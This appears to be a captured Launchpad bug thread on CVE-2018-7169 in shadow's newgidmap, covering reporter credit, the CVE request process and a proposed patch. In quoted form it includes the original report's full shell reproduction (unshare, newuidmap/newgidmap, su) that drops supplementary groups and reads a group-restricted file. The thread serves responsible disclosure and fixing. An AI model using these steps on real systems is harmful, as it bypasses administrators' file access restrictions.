      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbrauner" class="sprite person">Christian Brauner (cbrauner)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-02-15T12:00:52+00:00" title="2018-02-15 12:00:52 UTC">on 2018-02-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/19"> #19</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>On Thu, Feb 15, 2018 at 11:29:03AM -0000, Aleksa Sarai wrote:<br />
<span class="foldable-quoted">
&gt; I&#x27;ve just sent a request for a CVE. I&#x27;m working on the patch now. My
</span></p>
<p>I assume the CVE will at least be correctly attributed to Craig.</p>
<p>Christian</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">On Thu, Feb 15, 2018 at 11:29:03AM -0000, Aleksa Sarai wrote:
&gt; I've just sent a request for a CVE. I'm working on the patch now. My

I assume the CVE will at least be correctly attributed to Craig.

Christian
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/20" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cyphar" class="sprite person">Aleksa Sarai (cyphar)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-02-15T12:23:00+00:00" title="2018-02-15 12:23:00 UTC">on 2018-02-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/20"> #20</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  <a href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/comments/20/+download">Download full text</a> (5.0 KiB)
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Yes, of course. &quot;Craig Furman (Pivotal)&quot; is in the credits. I also<br />
added Akihiro Suda (for suggesting him that it was a newgidmap bug)<br />
and myself (for working on a fix for it), but if Craig prefers I can<br />
just make him the only credit.</p>
<p>On Thu, Feb 15, 2018 at 11:00 PM, Christian Brauner<br />
&lt;email address hidden&gt; wrote:<br />
<span class="foldable-quoted">
&gt; On Thu, Feb 15, 2018 at 11:29:03AM -0000, Aleksa Sarai wrote:<br />
&gt;&gt; I&#x27;ve just sent a request for a CVE. I&#x27;m working on the patch now. My<br />
&gt;<br />
&gt; I assume the CVE will at least be correctly attributed to Craig.<br />
&gt;<br />
&gt; Christian<br />
&gt;<br />
&gt; --<br />
&gt; You received this bug notification because you are subscribed to the bug<br />
&gt; report.<br />
&gt; <a rel="nofollow" href="https://bugs.launchpad.net/bugs/1729357">https:/<wbr />/bugs.launchpad<wbr />.net/bugs/<wbr />1729357</a><br />
&gt;<br />
&gt; Title:<br />
&gt;   unprivileged user can drop supplementary groups<br />
&gt;<br />
&gt; Status in shadow package in Ubuntu:<br />
&gt;   Confirmed<br />
&gt;<br />
&gt; Bug description:<br />
&gt;   Distribution: Ubuntu 16.04.3 LTS<br />
&gt;   Kernel: 4.4.0-97-generic<br />
&gt;   uidmap package version: 1:4.2-3.1ubuntu5.3<br />
&gt;<br />
&gt;   The newgidmap setuid executable allows any user to write a single<br />
&gt;   mapping line to the gid_map of a process whose identity is the same as<br />
&gt;   the calling process, as long as that mapping line maps the process&#x27;s<br />
&gt;   own GID outside of the user namespace to GID 0 inside the user<br />
&gt;   namespace.<br />
&gt;<br />
&gt;   Newgidmap will write the mapping regardless of the content of<br />
&gt;   /proc/$<wbr />process_<wbr />being_mapped/<wbr />setgroups, which will initially contain<br />
&gt;   the string &quot;allow&quot;. After this mapping is performed, and also after<br />
&gt;   the process&#x27; uid_map is written with newuidmap, the process in the<br />
&gt;   user namespace will be able to use the setgroups system call to drop<br />
&gt;   supplementary groups.<br />
&gt;<br />
&gt;   This is possible even if there is no entry for the user in<br />
&gt;   /etc/subgid, because no subordinate GIDs are actually being used.<br />
&gt;<br />
&gt;   This allows any user to circumvent the use of supplementary groups as<br />
&gt;   blacklists, e.g. for some file owned by root:blacklist with permission<br />
&gt;   bits 0604 (octal). Normally any process whose identity included the<br />
&gt;   group &quot;blacklist&quot; in its supplementary groups would not be able to<br />
&gt;   read that file. By performing this exploit using newgidmap, they can<br />
&gt;   drop all supplementary groups and read that file.<br />
&gt;<br />
&gt;   If newgidmap was not available, unprivileged users would not be able<br />
&gt;   to write a process&#x27;s gid_map until writing &quot;deny&quot; to<br />
&gt;   /proc/$<wbr />pid/setgroups. A fix for this might be for newgidmap to check<br />
&gt;   the content of /proc/$<wbr />process_<wbr />being_mapped/<wbr />setgroups is &quot;deny&quot;, but we<br />
&gt;   have not tried to patch this ourselves.<br />
&gt;<br />
&gt;   An example using 2 login shells for a user named &quot;someone&quot; on Ubuntu<br />
&gt;   Xenial, with the uidmap package installed:<br />
&gt;<br />
&gt;   Shell 1<br />
&gt;<br />
&gt;   someone@<wbr />ubuntu-<wbr />xenial:<wbr />~$ id<br />
&gt;   uid=1001(someone) gid=1001(someone) groups=<wbr />1001(someone)<wbr />,1002(restricte<wbr />d)<br />
&gt;<br />
&gt;   someone@<wbr />ubuntu-<wbr />xenial:<wbr />~$ ls -al /tmp/should_<wbr />restrict<br />
&gt;   -rw----r-- 1 root restricted 8 Nov  1 12:23 /tmp/should_<wbr />restrict<br />
&gt;<br />
&gt;   someone@<wbr />ubuntu-<wbr />xenial:<wbr />~$ cat /tmp/should_<wbr />restrict<br />
&gt;   cat: /tmp/should_<wbr />restrict: Permission denied<br />
&gt;<br />
&gt;   someone@<wbr />ubuntu-<wbr />xenial:<wbr />~$ unshare -U --setgroups allow #<br />
&gt;   /proc/self/<wbr />setgroups already contains &#x27;allow&#x27;, but let&#x27;s be explicit<br />
&gt;<br />
&gt;   nobody@<wbr />ubuntu-<wbr />xenial:<wbr />~$ echo $$<br />
&gt;   1878<br />
&gt;<br />
&gt;   Shell 2<br />
&gt;<br />
&gt;   someone@<wbr />ubuntu-<wbr />xenia..<wbr />.
</span></p></div>
    
    <p>
      <a href="/ubuntu/+source/shadow/+bug/1729357/comments/20">Read more...</a>
    </p>
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Yes, of course. "Craig Furman (Pivotal)" is in the credits. I also
added Akihiro Suda (for suggesting him that it was a newgidmap bug)
and myself (for working on a fix for it), but if Craig prefers I can
just make him the only credit.

On Thu, Feb 15, 2018 at 11:00 PM, Christian Brauner
&lt;christian.brauner@canonical.com&gt; wrote:
&gt; On Thu, Feb 15, 2018 at 11:29:03AM -0000, Aleksa Sarai wrote:
&gt;&gt; I've just sent a request for a CVE. I'm working on the patch now. My
&gt;
&gt; I assume the CVE will at least be correctly attributed to Craig.
&gt;
&gt; Christian
&gt;
&gt; --
&gt; You received this bug notification because you are subscribed to the bug
&gt; report.
&gt; https://bugs.launchpad.net/bugs/1729357
&gt;
&gt; Title:
&gt;   unprivileged user can drop supplementary groups
&gt;
&gt; Status in shadow package in Ubuntu:
&gt;   Confirmed
&gt;
&gt; Bug description:
&gt;   Distribution: Ubuntu 16.04.3 LTS
&gt;   Kernel: 4.4.0-97-generic
&gt;   uidmap package version: 1:4.2-3.1ubuntu5.3
&gt;
&gt;   The newgidmap setuid executable allows any user to write a single
&gt;   mapping line to the gid_map of a process whose identity is the same as
&gt;   the calling process, as long as that mapping line maps the process's
&gt;   own GID outside of the user namespace to GID 0 inside the user
&gt;   namespace.
&gt;
&gt;   Newgidmap will write the mapping regardless of the content of
&gt;   /proc/$process_being_mapped/setgroups, which will initially contain
&gt;   the string "allow". After this mapping is performed, and also after
&gt;   the process' uid_map is written with newuidmap, the process in the
&gt;   user namespace will be able to use the setgroups system call to drop
&gt;   supplementary groups.
&gt;
&gt;   This is possible even if there is no entry for the user in
&gt;   /etc/subgid, because no subordinate GIDs are actually being used.
&gt;
&gt;   This allows any user to circumvent the use of supplementary groups as
&gt;   blacklists, e.g. for some file owned by root:blacklist with permission
&gt;   bits 0604 (octal). Normally any process whose identity included the
&gt;   group "blacklist" in its supplementary groups would not be able to
&gt;   read that file. By performing this exploit using newgidmap, they can
&gt;   drop all supplementary groups and read that file.
&gt;
&gt;   If newgidmap was not available, unprivileged users would not be able
&gt;   to write a process's gid_map until writing "deny" to
&gt;   /proc/$pid/setgroups. A fix for this might be for newgidmap to check
&gt;   the content of /proc/$process_being_mapped/setgroups is "deny", but we
&gt;   have not tried to patch this ourselves.
&gt;
&gt;   An example using 2 login shells for a user named "someone" on Ubuntu
&gt;   Xenial, with the uidmap package installed:
&gt;
&gt;   Shell 1
&gt;
&gt;   someone@ubuntu-xenial:~$ id
&gt;   uid=1001(someone) gid=1001(someone) groups=1001(someone),1002(restricted)
&gt;
&gt;   someone@ubuntu-xenial:~$ ls -al /tmp/should_restrict
&gt;   -rw----r-- 1 root restricted 8 Nov  1 12:23 /tmp/should_restrict
&gt;
&gt;   someone@ubuntu-xenial:~$ cat /tmp/should_restrict
&gt;   cat: /tmp/should_restrict: Permission denied
&gt;
&gt;   someone@ubuntu-xenial:~$ unshare -U --setgroups allow #
&gt;   /proc/self/setgroups already contains 'allow', but let's be explicit
&gt;
&gt;   nobody@ubuntu-xenial:~$ echo $$
&gt;   1878
&gt;
&gt;   Shell 2
&gt;
&gt;   someone@ubuntu-xenial:~$ cat /etc/subuid
&gt;   lxd:100000:65536
&gt;   root:100000:65536
&gt;   ubuntu:165536:65536
&gt;
&gt;   someone@ubuntu-xenial:~$ cat /etc/subgid
&gt;   lxd:100000:65536
&gt;   root:100000:65536
&gt;   ubuntu:165536:65536
&gt;
&gt;   # There are no entries in /etc/sub{u,g}id for someone, but this
&gt;   doesn't matter that much as subordinate IDs are not being requested.
&gt;
&gt;   someone@ubuntu-xenial:~$ newuidmap 1878 0 1001 1
&gt;
&gt;   someone@ubuntu-xenial:~$ newgidmap 1878 0 1001 1
&gt;
&gt;   Back to shell 1
&gt;
&gt;   nobody@ubuntu-xenial:~$ id
&gt;   uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
&gt;
&gt;   # The presence of the "nogroup" supplementary group indicates that
&gt;   some unmapped GIDs are present as supplementary GIDs. The kernel knows
&gt;   that this process still has "restricted" in its supplementary groups,
&gt;   so it can't read the restricted file yet.
&gt;
&gt;   nobody@ubuntu-xenial:~$ cat /tmp/should_restrict
&gt;   cat: /tmp/should_restrict: Permission denied
&gt;
&gt;   # The process has gained CAP_SETGID in its user namespace by becoming
&gt;   UID 0. /proc/$pid/setgroups contains "allow", so it can call
&gt;   setgroups(2). By su-ing to root (itself, in the user namespace), it
&gt;   can drop the supplementary groups. It can't read /root/.bashrc as that
&gt;   file is owned by UID 0 in the initial user namespace, which creates
&gt;   some distracting error output but doesn't matter in this case.
&gt;
&gt;   nobody@ubuntu-xenial:~$ su root
&gt;   su: Authentication failure
&gt;   (Ignored)
&gt;   bash: /root/.bashrc: Permission denied
&gt;
&gt;   # Supplementary groups have been dropped
&gt;
&gt;   root@ubuntu-xenial:~# id
&gt;   uid=0(root) gid=0(root) groups=0(root)
&gt;
&gt;   # It can read the restricted file
&gt;
&gt;   root@ubuntu-xenial:~# cat /tmp/should_restrict
&gt;   content
&gt;
&gt; To manage notifications about this bug go to:
&gt; https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+subscriptions



-- 
Aleksa Sarai (cyphar)
www.cyphar.com
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/21" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~craigpivotal" class="sprite person">Craig Furman (craigpivotal)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-02-15T12:30:59.849013+00:00" title="2018-02-15 12:30:59 UTC">on 2018-02-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/21"> #21</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks for the credit! I did highlight that the bug was in newgidmap in my initial report, by the way.</p>
<p>Aleksa, thanks for asking for a CVE? How did you go about this? This is new territory to me.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thanks for the credit! I did highlight that the bug was in newgidmap in my initial report, by the way.

Aleksa, thanks for asking for a CVE? How did you go about this? This is new territory to me.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/22" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cyphar" class="sprite person">Aleksa Sarai (cyphar)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-02-15T13:03:16+00:00" title="2018-02-15 13:03:16 UTC">on 2018-02-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/22"> #22</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>On Thu, Feb 15, 2018 at 11:30 PM, Craig Furman<br />
&lt;email address hidden&gt; wrote:<br />
<span class="foldable-quoted">
&gt; Thanks for the credit! I did highlight that the bug was in newgidmap in<br />
&gt; my initial report, by the way.
</span></p>
<p>No problem -- you found the issue after all. Sorry for getting the timeline<br />
wrong, did you want me to change the credits at all? It&#x27;s your call.</p>
<p><span class="foldable-quoted">&gt; Aleksa, thanks for asking for a CVE? How did you go about this? This is<br />
&gt; new territory to me.
</span></p>
<p>You just submit the online form at <a rel="nofollow" href="https://cveform.mitre.org/">https:/<wbr />/cveform.<wbr />mitre.org/</a>. You can also go<br />
through the project if the project is registered with MITRE. (Canonical is<br />
registered for example, but since this bug affects all distributions and not<br />
just Ubuntu I felt it made more sense to just submit directly.)</p>
<p>There didn&#x27;t appear to be any way for me to add you to Cc in the form (I could<br />
only provide a single contact address), but I can forward the mails to you.</p>
<p><span class="foldable">--<br />
Aleksa Sarai (cyphar)<br />
www.cyphar.com
</span></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">On Thu, Feb 15, 2018 at 11:30 PM, Craig Furman
&lt;1729357@bugs.launchpad.net&gt; wrote:
&gt; Thanks for the credit! I did highlight that the bug was in newgidmap in
&gt; my initial report, by the way.

No problem -- you found the issue after all. Sorry for getting the timeline
wrong, did you want me to change the credits at all? It's your call.

&gt; Aleksa, thanks for asking for a CVE? How did you go about this? This is
&gt; new territory to me.

You just submit the online form at https://cveform.mitre.org/. You can also go
through the project if the project is registered with MITRE. (Canonical is
registered for example, but since this bug affects all distributions and not
just Ubuntu I felt it made more sense to just submit directly.)

There didn't appear to be any way for me to add you to Cc in the form (I could
only provide a single contact address), but I can forward the mails to you.

-- 
Aleksa Sarai (cyphar)
www.cyphar.com
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/23" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~craigpivotal" class="sprite person">Craig Furman (craigpivotal)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-02-15T13:34:41.671377+00:00" title="2018-02-15 13:34:41 UTC">on 2018-02-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/23"> #23</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>It&#x27;s really not a problem, I&#x27;m happy to leave it as it is.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">It's really not a problem, I'm happy to leave it as it is.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/24" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cyphar" class="sprite person">Aleksa Sarai (cyphar)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-02-15T14:05:53.168764+00:00" title="2018-02-15 14:05:53 UTC">on 2018-02-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/24"> #24</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p><a rel="nofollow" href="https://github.com/shadow-maint/shadow/pull/97">https:/<wbr />/github.<wbr />com/shadow-<wbr />maint/shadow/<wbr />pull/97</a> is my proposed patch. It currently only deals with the immediate security issue of allowing users that don&#x27;t have</p>
<p>&nbsp;&nbsp;% echo &quot;$(whoami):$(id -g):1&quot; &gt;&gt; /etc/setgid</p>
<p>... set up. I&#x27;ve tested this with a couple of different setups and it appears to preserve behaviour when you&#x27;re mapping subgid&#x27;d groups, but it restricts setgroups if the mapping is a fallback one. I was working on a patch for the flags code, but there&#x27;s a lot of magic in the parsing code for that -- so I will work on that separately.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">https://github.com/shadow-maint/shadow/pull/97 is my proposed patch. It currently only deals with the immediate security issue of allowing users that don't have

  % echo "$(whoami):$(id -g):1" &gt;&gt; /etc/setgid

... set up. I've tested this with a couple of different setups and it appears to preserve behaviour when you're mapping subgid'd groups, but it restricts setgroups if the mapping is a fallback one. I was working on a patch for the flags code, but there's a lot of magic in the parsing code for that -- so I will work on that separately.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/25" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cyphar" class="sprite person">Aleksa Sarai (cyphar)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-02-16T04:16:01.397689+00:00" title="2018-02-16 04:16:01 UTC">on 2018-02-16</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/25"> #25</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>CVE-2018-7169 is assigned for this issue.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">CVE-2018-7169 is assigned for this issue.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                 remoteBugComment " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/26" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          
          <td>
            <img width="14" height="14" src="/@@/bug-remote" alt="" />
            In
            <a itemprop="url" href="https://bugzilla.opensuse.org/show_bug.cgi?id=1081294">bugzilla.opensuse.org/ #1081294</a>,
            <a href="https://launchpad.net/~kbabioch-b" class="sprite person-inactive">Kbabioch-b (kbabioch-b)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-02-16T08:33:35+00:00" title="2018-02-16 08:33:35 UTC">on 2018-02-16</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/ubuntu/+source/shadow/+bug/1729357/comments/26">
                <strong></strong>
              </a>
          </td>

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/26"> #26</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>CVE-2018-7169</p>
<p>An issue was discovered in shadow 4.5. newgidmap (in shadow-utils) is setuid and<br />
allows an unprivileged user to be placed in a user namespace where setgroups(2)<br />
is permitted. This allows an attacker to remove themselves from a supplementary<br />
group, which may allow access to certain filesystem paths if the administrator<br />
has used &quot;group blacklisting&quot; (e.g., chmod g-rwx) to restrict access to paths.<br />
This flaw effectively reverts a security feature in the kernel (in particular,<br />
the /proc/self/<wbr />setgroups knob) to prevent this sort of privilege escalation.</p>
<p>References:<br />
<a rel="nofollow" href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2018-7169">http://<wbr />web.nvd.<wbr />nist.gov/<wbr />view/vuln/<wbr />detail?<wbr />vulnId=<wbr />CVE-2018-<wbr />7169</a><br />
<a rel="nofollow" href="http://www.cvedetails.com/cve/CVE-2018-7169/">http://<wbr />www.cvedetails.<wbr />com/cve/<wbr />CVE-2018-<wbr />7169/</a><br />
<a rel="nofollow" href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357">https:/<wbr />/bugs.launchpad<wbr />.net/ubuntu/<wbr />+source/<wbr />shadow/<wbr />+bug/1729357</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">CVE-2018-7169

An issue was discovered in shadow 4.5. newgidmap (in shadow-utils) is setuid and
allows an unprivileged user to be placed in a user namespace where setgroups(2)
is permitted. This allows an attacker to remove themselves from a supplementary
group, which may allow access to certain filesystem paths if the administrator
has used "group blacklisting" (e.g., chmod g-rwx) to restrict access to paths.
This flaw effectively reverts a security feature in the kernel (in particular,
the /proc/self/setgroups knob) to prevent this sort of privilege escalation.

References:
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2018-7169
http://www.cvedetails.com/cve/CVE-2018-7169/
https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                 remoteBugComment " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/27" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          
          <td>
            <img width="14" height="14" src="/@@/bug-remote" alt="" />
            In
            <a itemprop="url" href="https://bugzilla.opensuse.org/show_bug.cgi?id=1081294">bugzilla.opensuse.org/ #1081294</a>,
            <a href="https://launchpad.net/~kbabioch-b" class="sprite person-inactive">Kbabioch-b (kbabioch-b)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-02-16T08:38:46+00:00" title="2018-02-16 08:38:46 UTC">on 2018-02-16</time><span class="editable-message-last-edit-date">:
              </span>
